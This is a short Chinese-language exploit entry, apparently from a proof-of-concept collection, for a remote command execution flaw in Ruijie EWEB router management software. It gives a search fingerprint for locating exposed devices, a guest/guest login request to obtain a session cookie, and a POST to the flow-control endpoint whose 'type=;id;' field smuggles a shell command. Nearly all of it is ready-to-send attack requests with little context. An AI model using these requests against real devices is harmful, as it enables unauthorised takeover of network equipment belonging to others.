# 锐捷EWEB路由器control.php存在远程命令执行漏洞

- **系统**：锐捷　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="锐捷网络-EWEB网管系统"`
- **请求**：`POST /ddi/server/login.php HTTP/1.1`

**请求体 / payload**
```
获取cookie
Host:
Content-Type: application/x-www-form-urlencoded
username=guest&password=guest?
利用可用cookie访问接口
POST /flow_control_pi/flwo.control.php?a=setFlowGroup HTTP/1.1
Host:
Content-Length: 9
Content-Type: application/x-www-form-urlencoded
Cookie: RUIJIEID=caoefsqfkdu8cn0u6tvil530m6; user=admin
type=;id;
```
- **预期**：200　|　—